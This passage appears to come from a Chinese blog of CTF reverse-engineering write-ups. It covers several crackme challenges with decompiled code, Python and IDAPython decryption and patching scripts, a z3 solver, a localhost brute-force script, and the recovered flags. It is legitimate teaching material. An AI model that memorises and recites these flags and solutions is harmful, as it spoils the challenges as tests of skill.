class="line">main_encrypto: 3des + base64</span><br><span class="line">Encrypt_HashHex2: sha256</span><br><span class="line">Encrypt_HashHex5: sha512 </span><br><span class="line">main_hash: md5</span><br></pre></td></tr></table></figure><p>3DES解密如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;WelcomeToTheGKCTF2021XXX&quot;</span></span><br><span class="line">iv = <span class="string">b&quot;1Ssecret&quot;</span></span><br><span class="line">cipher = <span class="string">b&quot;o/aWPjNNxMPZDnJlNp0zK5+NLPC4Tv6kqdJqjkL0XkA=&quot;</span></span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">des3 = DES3.new(key, DES3.MODE_CBC, iv)</span><br><span class="line">plain = des3.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><p>其他的Hash网上查,或者直接爆破 , 得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GKCTF&#123;87f645e9-b628-412f-9d7a-e402f20af940&#125;</span><br></pre></td></tr></table></figure><h3 id="CFI-CTF-2018-powerPacked"><a href="#CFI-CTF-2018-powerPacked" class="headerlink" title="[CFI-CTF 2018]powerPacked"></a>[CFI-CTF 2018]powerPacked</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  tmp file powerPacker</span><br><span class="line">powerPacker: ELF 32-bit MSB executable, PowerPC or cisco 4500, version 1 (GNU/Linux), statically linked, stripped</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105194945152.png" alt="image-20211105194945152"></p><p>upx解压后</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+8h] [-58h]</span></span><br><span class="line">  _BYTE v5[<span class="number">32</span>]; <span class="comment">// [sp+10h] [-50h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">24</span>]; <span class="comment">// [sp+30h] [-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+48h] [-18h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v8; <span class="comment">// [sp+4Ch] [-14h]</span></span><br><span class="line"></span><br><span class="line">  v7 = argc;</span><br><span class="line">  v8 = argv;</span><br><span class="line">  <span class="built_in">strcpy</span>(v6, <span class="string">&quot;EHK&#125;kanqxgarqygtre&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Insert password : &quot;</span>, argv, envp);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%31s&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">21</span>; ++i )</span><br><span class="line">    v6[i] -= <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v5, v6) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong password.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password is correct. Submit this as the flag.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">b&quot;EHK&#125;kanqxgarqygtre&quot;</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">	flag.append(i - <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><h3 id="FlareOn4-greek-to-me"><a href="#FlareOn4-greek-to-me" class="headerlink" title="[FlareOn4]greek_to_me"></a>[FlareOn4]greek_to_me</h3><p>反编译出来以后，主函数中存在一段SMC</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105204329643.png" alt="image-20211105204329643"></p><p>其中v3来自<code>buf[0]</code>, 而buf来自下面的函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">SOCKET __cdecl <span class="title">sub_401121</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  SOCKET v2; <span class="comment">// esi</span></span><br><span class="line">  SOCKET v3; <span class="comment">// eax</span></span><br><span class="line">  SOCKET v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">WSAData</span> <span class="title">WSAData</span>;</span> <span class="comment">// [esp+0h] [ebp-1A0h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">name</span>;</span> <span class="comment">// [esp+190h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( WSAStartup(<span class="number">0x202</span>u, &amp;WSAData) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v2 = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    name.sa_family = <span class="number">2</span>;</span><br><span class="line">    *(_DWORD *)&amp;name.sa_data[<span class="number">2</span>] = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    *(_WORD *)name.sa_data = htons(<span class="number">0x8AE</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( bind(v2, &amp;name, <span class="number">16</span>) != <span class="number">-1</span> &amp;&amp; listen(v2, <span class="number">0x7FFFFFFF</span>) != <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = accept(v2, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      v4 = v3;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( recv(v3, buf, <span class="number">4</span>, <span class="number">0</span>) &gt; <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">return</span> v4;</span><br><span class="line">        closesocket(v4);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closesocket(v2);</span><br><span class="line">  &#125;</span><br><span class="line">  WSACleanup();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>监听本地<code>2222</code>端口, 并接受4个字节</p><p>由于主函数中有校验, 如果成功会输出<code>Congratulations! But wait, where&#39;s my flag?</code></p><p>那么我们可以通过爆破将这个<code>buf[0]</code>算出来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">2222</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    os.startfile(<span class="string">&quot;greek_to_me.exe&quot;</span>)</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    s.send(<span class="built_in">chr</span>(i))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Congratulations&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%x&quot;</span> % i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>可得<code>buf</code>值为<code>a2</code></p><p>则可自己写个<code>idapython</code>脚本进行解密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line">buf = ida_bytes.get_bytes(<span class="number">0x04010A0</span>, <span class="number">121</span>)</span><br><span class="line">buf = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: ((x ^ <span class="number">0xa2</span>) + <span class="number">34</span>) &amp; <span class="number">0xff</span>, buf))</span><br><span class="line">ida_bytes.patch_bytes(<span class="number">0x04010A0</span>, <span class="built_in">bytes</span>(buf))</span><br></pre></td></tr></table></figure><p>解密后得到flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105212736008.png" alt="image-20211105212736008"></p><p>写个脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bg = <span class="number">0x0040107C</span></span><br><span class="line">end = <span class="number">0x004010F1</span></span><br><span class="line"></span><br><span class="line">addr = bg</span><br><span class="line">flag = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> addr+get_item_size(addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> addr &lt; end:</span><br><span class="line">    <span class="keyword">if</span> addr == <span class="number">0x0040107C</span> <span class="keyword">or</span> addr == <span class="number">0x00401085</span>:</span><br><span class="line">        addr = next_instr(addr)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    d = get_operand_value(addr, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">0x12</span>:</span><br><span class="line">        flag.append(<span class="number">0x5F</span>)</span><br><span class="line">    <span class="keyword">elif</span> d == <span class="number">0x13</span>:</span><br><span class="line">        flag.append(<span class="number">0x65</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag.append(get_operand_value(addr, <span class="number">1</span>))</span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><p>得<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">et_tu_brute_force@flare-on.com</span><br></pre></td></tr></table></figure><h3 id="INSHack2018-Tricky-Part1"><a href="#INSHack2018-Tricky-Part1" class="headerlink" title="[INSHack2018]Tricky-Part1"></a>[INSHack2018]Tricky-Part1</h3><p>校验函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> *__fastcall <span class="title">stack_check</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+1Bh] [rbp-25h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(&amp;v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(v8, <span class="string">&quot;GDB&quot;</span>, &amp;v6);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= <span class="built_in">std</span>::<span class="built_in">string</span>::size((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;base) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = i;</span><br><span class="line">    v2 = <span class="built_in">std</span>::<span class="built_in">string</span>::size((<span class="built_in">std</span>::<span class="built_in">string</span> *)v8);</span><br><span class="line">    LOBYTE(v1) = *(_BYTE *)<span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>[](v8, v1 % v2);</span><br><span class="line">    v3 = (_BYTE *)<span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>[](&amp;base, i);</span><br><span class="line">    *v3 ^= v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(a1, (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;base);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v8);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中异或的数组<code>GDB</code></p><p>base初始化函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __fastcall __static_initialization_and_destruction_0(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">17</span>]; <span class="comment">// [rsp+1Fh] [rbp-11h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> &amp;&amp; a2 == <span class="number">0xFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::ios_base::Init::Init((<span class="built_in">std</span>::ios_base::Init *)&amp;<span class="built_in">std</span>::__ioinit);</span><br><span class="line">    __cxa_atexit(<span class="built_in">std</span>::ios_base::Init::~Init, &amp;<span class="built_in">std</span>::__ioinit, &amp;_dso_handle);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(v3);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(&amp;base, &amp;byte_401278, v3);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(v3);</span><br><span class="line">    <span class="keyword">return</span> __cxa_atexit(<span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>, &amp;base, &amp;_dso_handle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">0x0E</span>, <span class="number">0x0A</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x3F</span>, <span class="number">0x01</span>, <span class="number">0x1F</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x76</span>, <span class="number">0x37</span>, <span class="number">0x1D</span>, <span class="number">0x2F</span>, <span class="number">0x70</span>, <span class="number">0x30</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x30</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x72</span>, <span class="number">0x35</span>, <span class="number">0x1B</span>, <span class="number">0x31</span>, <span class="number">0x33</span>, <span class="number">0x70</span>, <span class="number">0x36</span>, <span class="number">0x76</span>, <span class="number">0x27</span>, <span class="number">0x1D</span>, <span class="number">0x73</span>, <span class="number">0x2A</span>, <span class="number">0x76</span>, <span class="number">0x2B</span>, <span class="number">0x75</span>, <span class="number">0x31</span>, <span class="number">0x3E</span>, <span class="number">0x37</span>, <span class="number">0x1D</span>, <span class="number">0x30</span>, <span class="number">0x2C</span>, <span class="number">0x71</span>, <span class="number">0x29</span>, <span class="number">0x1B</span>, <span class="number">0x26</span>, <span class="number">0x74</span>, <span class="number">0x26</span>, <span class="number">0x37</span>, <span class="number">0x20</span>, <span class="number">0x23</span>, <span class="number">0x71</span>, <span class="number">0x35</span>, <span class="number">0x1B</span>, <span class="number">0x24</span>, <span class="number">0x73</span>, <span class="number">0x75</span>, <span class="number">0x2E</span>, <span class="number">0x34</span>, <span class="number">0x39</span>]</span><br><span class="line"></span><br><span class="line">xor_data = <span class="string">b&quot;GDB&quot;</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    flag.append(data[i] ^ xor_data[i % <span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-VirtualTree"><a href="#MRCTF2020-VirtualTree" class="headerlink" title="[MRCTF2020]VirtualTree"></a>[MRCTF2020]VirtualTree</h3><p>动调，可以看到题目存在代码自修改与花指令</p><p>先写脚本去花</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line">bg = <span class="number">0x0401470</span></span><br><span class="line">end = <span class="number">0x0040160B</span></span><br><span class="line"></span><br><span class="line">addr = bg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> addr+get_item_size(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> addr &lt; end:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;jz&quot;</span> == print_insn_mnem(addr):</span><br><span class="line">        <span class="keyword">if</span> ida_bytes.get_byte(addr+<span class="number">0x2</span>) == <span class="number">0xe8</span>:</span><br><span class="line">            patch_byte(addr + <span class="number">0x2</span>, <span class="number">0x90</span>)</span><br><span class="line">            addr += <span class="number">0x3</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line">addr = bg</span><br><span class="line"><span class="keyword">while</span> addr &lt; end:</span><br><span class="line">    ida_bytes.del_items(addr)</span><br><span class="line">    addr = next_instr(addr)</span><br></pre></td></tr></table></figure><p>动调起来就可以看到具体的函数了，分析如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_A416F0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  add(<span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">xor</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">  add(<span class="number">2</span>, <span class="number">7</span>);</span><br><span class="line">  subabs(<span class="number">3</span>, <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">xor</span>(<span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">  subabs(<span class="number">6</span>, <span class="number">1</span>);</span><br><span class="line">  add(<span class="number">7</span>, <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">xor</span>(<span class="number">8</span>, <span class="number">7</span>);</span><br><span class="line">  subabs(<span class="number">9</span>, <span class="number">8</span>);</span><br><span class="line">  subabs(<span class="number">10</span>, <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">xor</span>(<span class="number">11</span>, <span class="number">12</span>);</span><br><span class="line">  subabs(<span class="number">12</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">xor</span>(<span class="number">14</span>, <span class="number">15</span>);</span><br><span class="line">  add(<span class="number">15</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>add函数：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">add</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  input[a1] += a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>xor函数：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">xor</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  input[a1] ^= input[a2];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>subabs函数：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">subabs</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="keyword">unsigned</span> __int8)input[a1] - (<span class="keyword">unsigned</span> __int8)input[a2];</span><br><span class="line">  input[a1] = (BYTE4(v2) ^ v2) - BYTE4(v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比数据<code>cmp_data = [0x17, 0x63, 0x77, 0x03, 0x52, 0x2E, 0x4A, 0x28, 0x52, 0x1B, 0x17, 0x12, 0x3A, 0x0A, 0x6C, 0x62]</code></p><p>输入的flag会先异或一下</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105225039661.png" alt="image-20211105225039661"></p><p>可以下断将异或的数据打出来</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105225122392.png" alt="image-20211105225122392"></p><p>得到异或数据<code>xor_data = [77,76,71,80,79,75,70,67,74,69,78,73,72,68,66,65]</code></p><p>则解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">cmp_data = [<span class="number">0x17</span>, <span class="number">0x63</span>, <span class="number">0x77</span>, <span class="number">0x03</span>, <span class="number">0x52</span>, <span class="number">0x2E</span>, <span class="number">0x4A</span>,</span><br><span class="line">            <span class="number">0x28</span>, <span class="number">0x52</span>, <span class="number">0x1B</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x6C</span>, <span class="number">0x62</span>]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">_data = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">data = _data[:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">a1, a2</span>):</span></span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    data[a1] += a2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Xor</span>(<span class="params">a1, a2</span>):</span></span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    data[a1] ^= data[a2]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Subabs</span>(<span class="params">a1, a2</span>):</span></span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    n = data[a1] - data[a2]</span><br><span class="line">    data[a1] = (n ^ (n &gt;&gt; <span class="number">31</span>)) - (n &gt;&gt; <span class="number">31</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">Xor(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>, <span class="number">7</span>)</span><br><span class="line">Subabs(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">Xor(<span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">Subabs(<span class="number">6</span>, <span class="number">1</span>)</span><br><span class="line">Add(<span class="number">7</span>, <span class="number">3</span>)</span><br><span class="line">Xor(<span class="number">8</span>, <span class="number">7</span>)</span><br><span class="line">Subabs(<span class="number">9</span>, <span class="number">8</span>)</span><br><span class="line">Subabs(<span class="number">10</span>, <span class="number">7</span>)</span><br><span class="line">Xor(<span class="number">11</span>, <span class="number">12</span>)</span><br><span class="line">Subabs(<span class="number">12</span>, <span class="number">2</span>)</span><br><span class="line">Xor(<span class="number">14</span>, <span class="number">15</span>)</span><br><span class="line">Add(<span class="number">15</span>, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    data[i] &amp;= <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(data, cmp_data):</span><br><span class="line">    s.add(i == j)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    s.add(_data[i] &gt;= <span class="number">0</span>)</span><br><span class="line">    s.add(_data[i] &lt;= <span class="number">0x7f</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = []</span><br><span class="line">    xor_data = [<span class="number">77</span>, <span class="number">76</span>, <span class="number">71</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">75</span>, <span class="number">70</span>, <span class="number">67</span>, <span class="number">74</span>, <span class="number">69</span>, <span class="number">78</span>, <span class="number">73</span>, <span class="number">72</span>, <span class="number">68</span>, <span class="number">66</span>, <span class="number">65</span>]</span><br><span class="line">    conditions = []</span><br><span class="line">    <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(_data, xor_data):</span><br><span class="line">        flag.append(m[i].as_long() ^ j)</span><br><span class="line">        conditions.append(i != m[i].as_long())</span><br><span class="line">    s.add(Or(conditions))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><p>跑出来有好几个结果, 第二个就是flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105231836000.png" alt="image-20211105231836000"></p><p>这道题多解233333</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105231955791.png" alt="image-20211105231955791"></p><h3 id="b01lers2020-chugga-chugga"><a href="#b01lers2020-chugga-chugga" class="headerlink" title="[b01lers2020]chugga_chugga"></a>[b01lers2020]chugga_chugga</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  chugga_chugga file chugga</span><br><span class="line">chugga: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure><p>核心代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">input = (_BYTE *)*v25;</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt;= <span class="number">2</span> )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">2</span>] != <span class="string">&#x27;t&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">9</span>] != <span class="string">&#x27;c&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt;= <span class="number">0x10</span> )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">16</span>] != <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt;= <span class="number">0x15</span> )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> ( input[<span class="number">21</span>] != <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line"><span 